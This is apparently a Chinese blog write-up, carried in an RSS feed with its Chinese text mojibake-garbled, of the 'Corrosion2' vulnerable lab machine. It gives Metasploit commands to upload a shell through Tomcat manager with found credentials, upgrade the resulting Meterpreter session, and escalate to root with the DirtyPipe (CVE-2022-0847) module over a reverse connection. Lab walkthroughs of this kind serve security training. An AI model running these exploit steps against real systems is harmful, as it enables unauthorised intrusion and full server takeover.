<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767860567499-1dd3e58b-77b6-4435-869d-bc7ed67797bb.png" alt="" loading="lazy"></p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767860580515-e2ea5737-c24a-40f1-a295-a7a12e457739.png" alt="" loading="lazy"></p>
<h2 id="24ææ-åæ ¸æ¼æ´">2.4ææ-åæ ¸æ¼æ´</h2>
<p>å¯ç¨æä½ç³»ç»çæ¬åæ ¸æ¼æ´ææ</p>
<p>msfæ¼æ´å©ç¨</p>
<pre><code class="language-python">search tomcat upload
use 7
options
</code></pre>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768397978392-13dde72c-191d-41c4-8872-1c7753ceb9d8.png" alt="" loading="lazy"></p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398030818-436e42b8-0a3a-45b5-9a25-b2c9a42c9868.png" alt="" loading="lazy"></p>
<p>è®¾ç½®åæ°å¼å§å©ç¨</p>
<pre><code class="language-python">msf exploit(multi/http/tomcat_mgr_upload) &gt; set rhosts 192.168.222.135
rhosts =&gt; 192.168.222.135
msf exploit(multi/http/tomcat_mgr_upload) &gt; set rport 8080
rport =&gt; 8080
msf exploit(multi/http/tomcat_mgr_upload) &gt; set HttpUsername admin
HttpUsername =&gt; admin
msf exploit(multi/http/tomcat_mgr_upload) &gt; set HttpPassword melehifokivai
HttpPassword =&gt; melehifokivai
msf exploit(multi/http/tomcat_mgr_upload) &gt; options
msf exploit(multi/http/tomcat_mgr_upload) &gt; run
</code></pre>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398081653-71bade4e-c0d2-45a8-9c30-5e1a059f7a3c.png" alt="" loading="lazy"></p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398170110-9c526eeb-edb1-41c0-b5b9-316eff262666.png" alt="" loading="lazy"></p>
<p>åå°è¿è¡ session</p>
<p>åçº§ Java Meterpreter â åç Linux Meterpreter</p>
<pre><code class="language-plain">background
sessions -u 1
</code></pre>
<p>æ session 1ï¼Java Meterpreterï¼åçº§æçæ­£ç <strong>Linux x86 Meterpreter</strong>ï¼session 2ï¼</p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398401444-52a916e1-31f3-44d7-aa84-a6092074f627.png" alt="" loading="lazy"></p>
<p>æ¥ç</p>
<pre><code class="language-plain">sessions l
</code></pre>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398485753-8ed545b3-d3ca-4770-aa59-a76e1ecddf98.png" alt="" loading="lazy"></p>
<p>æ¥ç DirtyPipe æææ¨¡å ï¼æ ¹æ®Linux åæ ¸çæ¬æä»¬å°è¯å©ç¨çæ¯cve-2022-0847</p>
<pre><code class="language-plain">search cve-2022-0847
use exploit/linux/local/cve_2022_0847_dirtypipeæèuse 0
</code></pre>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398537111-cb27b496-d3ff-414a-a7f6-fb46f493a3ca.png" alt="" loading="lazy"></p>
<p>è®¾ç½®åæ°</p>
<pre><code class="language-plain">set session 2 #è®¾ç½®ä½¿ç¨çä¼è¯
set lhost 192.168.222.137 #è®¾ç½®æ¥æ¶çIP
run
</code></pre>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398723499-a7fa7fcb-9658-4edb-8ef7-a2a7da7c498d.png" alt="" loading="lazy"></p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398752106-102483b7-6610-4e75-87e6-d27b586c26fb.png" alt="" loading="lazy"></p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398839025-bc36ab9e-6a92-4a08-b340-4c3d2b4e0262.png" alt="" loading="lazy"></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-20 15:46">2026-01-20 15:45</span>&nbsp;
<a href="https://www.cnblogs.com/yuell">æä¸å¤§ç</a>&nbsp;
éè¯»(<span id="post_view_count">47</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19507210);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19507210', targetLink: 'https://www.cnblogs.com/yuell/p/19507210', title: 'Corrosion2é¶æº' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
        </channel>
        </rss>